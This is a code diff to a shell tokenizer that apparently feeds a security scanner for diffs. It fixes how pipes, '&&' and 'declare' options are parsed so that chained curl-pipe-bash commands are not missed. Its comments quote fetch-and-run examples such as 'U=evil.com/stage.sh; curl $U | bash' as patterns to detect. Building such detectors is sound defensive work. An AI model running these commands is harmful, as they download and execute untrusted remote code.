@@ -584,6 +584,19 @@ def join_line_continuations(lines: list[str]) -> list[str]:
     return list(_join_line_continuations_cached(tuple(lines)))
 
 
+def _tail_continues(stripped_tail: str) -> bool:
+    """True when a logical line ending in *stripped_tail* promises more.
+
+    Bash continues without a backslash when the line ends in a pipe or a
+    conditional operator: `curl url |` + newline + `bash` is one
+    pipeline.  The two joiners must agree, or the rule path and the
+    coverage path read different text from the same diff.
+    """
+    return ((stripped_tail.endswith("|")
+             and not stripped_tail.endswith("\\|"))
+            or stripped_tail.endswith("&&"))
+
+
 @lru_cache(maxsize=8)
 def _join_line_continuations_cached(lines: tuple[str, ...]) -> tuple[str, ...]:
     """Join shell line continuations into single logical lines.
@@ -627,8 +640,11 @@ def _join_line_continuations_cached(lines: tuple[str, ...]) -> tuple[str, ...]:
                 out.append(marker + flush())
             parts, marker = [body], this_marker
         tail = parts[-1]
-        if tail.rstrip().endswith("\\"):
-            parts[-1] = tail.rstrip()[:-1].rstrip()
+        stripped_tail = tail.rstrip()
+        if stripped_tail.endswith("\\"):
+            parts[-1] = stripped_tail[:-1].rstrip()
+        elif _tail_continues(stripped_tail):
+            pass  # still accumulating: an operator promises more input
         else:
             out.append(marker + flush())
             parts, marker = None, ""
@@ -653,13 +669,19 @@ def _join_line_continuations_cached(lines: tuple[str, ...]) -> tuple[str, ...]:
 # `x=''` was recorded and `x=` was not, which is the same assignment written
 # two ways and the difference between High and Medium.
 _ASSIGNMENT_RE = re.compile(
-    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*(.*)"
+    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+"
+    # Scalar option run (`declare -rx x=`, `declare +x`).  Only `r`/`x`
+    # keep scalar-assignment semantics; `-n` is a nameref and `-a`/`-A`
+    # are arrays - recording them as scalars collapsed the nameref
+    # `declare -n R=C` to a literal and hid the X002 command it aliases.
+    r"(?:(?:--?|\+\+?)[rx]+\s+){0,4})?(\w+)\s*(\+?=)\s*(.*)"
 )
 
 # Array assignment opener: ``_c=(curl -fsSL)`` or ``source=(`` spanning
 # several lines.  Captured group 3 is the text after ``(``.
 _ARRAY_ASSIGNMENT_RE = re.compile(
-    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*\((.*)"
+    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+"
+    r"(?:(?:--?|\+\+?)[rx]+\s+){0,4})?(\w+)\s*(\+?=)\s*\((.*)"
 )
 
 
@@ -667,6 +689,18 @@ _ARRAY_ASSIGNMENT_RE = re.compile(
 # followed by ``[`` is an array subscript and is handled by
 # :func:`resolve_expansions` instead, so the ``[`` stays outside this match.
 _VAR_REF_RE = re.compile(r"\$\{(\w+)\}(?!\[)|\$(\w+)")
+
+
+def _split_top_level(body: str) -> list[str]:
+    """*body* split on command separators, respecting quotes.
+
+    Reuses the crossfire splitter rather than growing a second one here.
+    Imported lazily: :mod:`analysis.crossfire` imports this module's
+    public tokenizer at module level, so a top-level import would close
+    the loop.
+    """
+    from .analysis.crossfire import _split_commands
+    return _split_commands(body)
 
 
 # Substitution is iterated, and each round can double a value that refers
@@ -1134,6 +1168,11 @@ def _variable_table_with_spans(
                 scalar_match.group(2),
                 scalar_match.group(3).strip(),
             )
+            # In `U=x; curl $U | bash` the shell assigns, then runs a
+            # second command: only the first command's value is assigned.
+            # Recording the whole tail made the value reference itself and
+            # substitution re-expanded it until the size bound tripped.
+            value = _split_top_level(value)[0].strip()
             value = _strip_outer_quotes(value)
             # A command substitution has no static value, so it cannot be
             # folded into the table.  The name's value is unknown from this
@@ -1253,8 +1292,11 @@ def _joined_indexed(lines: list[str]) -> list[tuple[int, str]]:
                 out.append((start_index, marker + flush()))
             parts, marker, start_index = [body], this_marker, i
         tail = parts[-1]
-        if tail.rstrip().endswith("\\"):
-            parts[-1] = tail.rstrip()[:-1].rstrip()
+        stripped_tail = tail.rstrip()
+        if stripped_tail.endswith("\\"):
+            parts[-1] = stripped_tail[:-1].rstrip()
+        elif _tail_continues(stripped_tail):
+            pass  # still accumulating: an operator promises more input
         else:
             out.append((start_index, marker + flush()))
             parts, marker, start_index = None, "", -1
@@ -1296,15 +1338,26 @@ def tokenize_and_resolve_indexed(
     # to the table rather than a command line to match against; anything
     # else is a candidate for resolution.
     shell_at = _assignments_are_shell(split_lines(diff_text))
+
+    def _folds_away(line: str) -> bool:
+        """True when *line* is nothing but an assignment declaration.
+
+        ``U=evil.com/stage.sh; curl $U | bash`` matches the assignment
+        shape, but only up to the first separator: the rest is a second
+        command.  Folding such a line hides it from every resolved-target
+        rule - R001 included - which is how a curl-pipe-bash chained after
+        an assignment went unflagged while the raw-line rules saw only
+        their narrow scopes.
+        """
+        m = _ASSIGNMENT_RE.match(line)
+        if not m or "$(" in m.group(3) or "`" in m.group(3):
+            return False
+        return len(_split_top_level(line)) <= 1
+
     candidates = [
         (addition_indices[k], line)
         for k, line in enumerate(additions)
-        if not (
-            shell_at[addition_indices[k]]
-            and (m := _ASSIGNMENT_RE.match(line))
-            and "$(" not in m.group(3)
-            and "`" not in m.group(3)
-        )
+        if not (shell_at[addition_indices[k]] and _folds_away(line))
     ]
 
     resolved = []
